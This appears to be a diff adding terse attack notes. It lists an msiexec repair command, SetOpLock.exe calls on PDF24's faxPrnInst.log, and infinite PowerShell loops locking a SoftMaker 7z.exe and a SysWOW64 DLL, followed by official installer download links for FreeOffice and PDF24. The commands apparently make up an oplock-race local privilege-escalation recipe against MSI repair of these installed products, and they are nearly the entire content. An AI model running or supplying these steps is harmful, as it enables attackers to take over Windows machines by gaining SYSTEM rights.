@@ -1,0 +1,15 @@
+
+
+msiexec.exe /fa 
+
+
+SetOpLock.exe "C:\Program Files\PDF24\faxPrnInst.log" r
+
+while ($true) { SetOpLock.exe "C:\Program Files\SoftMaker Office 2024\tb\7z.exe" x }
+while ($true) { SetOpLock.exe "C:\Windows\SysWOW64\OneCoreCommonProxyStub.dll" x }
+
+
+
+
+https://www.softmaker.net/down/freeoffice2021.msi
+https://download.pdf24.org/pdf24-creator-11.14.0.msi
